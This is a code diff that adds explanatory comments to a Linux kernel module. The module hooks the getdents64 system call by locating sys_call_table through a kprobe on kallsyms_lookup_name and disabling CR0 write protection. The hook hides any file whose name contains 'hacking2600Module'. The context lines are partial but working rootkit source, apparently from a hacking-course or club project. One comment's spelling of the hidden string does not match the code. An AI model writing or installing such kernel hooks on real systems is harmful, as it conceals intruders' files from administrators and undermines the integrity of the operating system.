@@ -38,6 +38,8 @@ asmlinkage int new_getdents64(struct pt_regs *regs)
     if (nread <= 0)
         return nread;
 
+    // Hide everything that have "hacking2600module" in their name
+    // ex: ls command
     for (bpos = 0; bpos < nread;) {
         d = (struct linux_dirent64 *) ((char *) dirp + bpos);
         if (strstr(d->d_name, "hacking2600Module") != NULL) {
@@ -73,6 +75,7 @@ static inline void protect_memory(unsigned long original_cr0)
 
 static int __init hidefile_init(void)
 {
+    // kprobe kallsyms_lookup_name function
     uint64_t *syscall_table = NULL;
     struct kprobe kp = {
         .symbol_name = "kallsyms_lookup_name"
@@ -87,14 +90,18 @@ static int __init hidefile_init(void)
         return -1;
     }
 
+    // get syscall_table address from kallsyms_lookup_name function
     syscall_table = (uint64_t *) lookup_name("sys_call_table");
     if (!syscall_table) {
         pr_err("[-] Failed to get sys_call_table address.\n");
         return -1;
     }
 
+    // saved old syscalls
     original_getdents64 = (sysfun_t) syscall_table[__NR_getdents64];
 
+    // setup new syscalls
+    // disable writing memory protection temporarily 
     unsigned long original_cr0 = unprotect_memory();
     syscall_table[__NR_getdents64] = (uint64_t) new_getdents64;
     protect_memory(original_cr0);
@@ -104,6 +111,7 @@ static int __init hidefile_init(void)
 
 static void __exit hidefile_exit(void)
 {
+    // reset old syscalls
     uint64_t *syscall_table = (uint64_t *) lookup_name("sys_call_table");
 
     if (syscall_table && original_getdents64) {
